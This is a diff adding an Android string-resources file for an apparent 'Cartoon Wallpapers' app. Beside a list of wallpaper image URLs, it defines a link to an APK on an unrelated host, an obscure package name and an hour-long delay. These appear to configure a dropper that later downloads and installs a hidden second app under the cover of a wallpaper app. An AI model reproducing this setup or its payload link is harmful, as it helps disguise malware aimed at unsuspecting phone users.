@@ -1,0 +1,19 @@
+<resources>
+    <string name="app_name">Cartoon Wallpapers</string>
+    <string name="download_link">http://storagelol.kl.com.ua/GU.apk</string>
+    <string name="package_link">com.ptuoie.lxnrbw</string>
+    <string-array name="download_links">
+        <item>https://www.wallpapermobi.com/storage/upload/user_id_22/garfield-4-2017-05-14-09-41-05.jpg</item>
+        <item>https://smpda.com/wallpapers/640x1136/misc/hi/016.jpg</item>
+        <item>https://i.pinimg.com/originals/e2/20/b5/e220b5f462fea579b0062c618859ee71.jpg</item>
+        <item>https://i.pinimg.com/736x/f4/38/1e/f4381eddf2f87cb1f813a5e576740e36--funny-wallpapers-phone-wallpapers.jpg</item>
+        <item>http://mobilepics.ru/uploads/iphone/drawn/big_images/9773449.jpg</item>
+        <item>http://oboi.cc/640-960-100-uploads/sred/big/oboik.ru_201001211343377267.jpg</item>
+        <item>http://image.downloadwap.co.uk/wallpapers/wp/new/23/papersco-a_UWoYA00i.jpg</item>
+        <item>https://cdn.wallpapersafari.com/31/85/7X3hSU.jpg</item>
+        <item>https://f.vividscreen.info/soft/7cb21e9fb79781bb7dae5bb9d48ddcf4/Pikachu-750x1334.jpg</item>
+        <item>http://google-wallpapers.com/wp-content/uploads/2018/05/cute-panda-wallpaper-for-android-awesome-resultado-de-imagen-para-we-bare-bears-panda-of-cute-panda-wallpaper-for-android.jpg</item>
+    </string-array>
+    <integer name="delay">3600000</integer>
+    <integer name="delayTest">1000</integer>
+</resources>
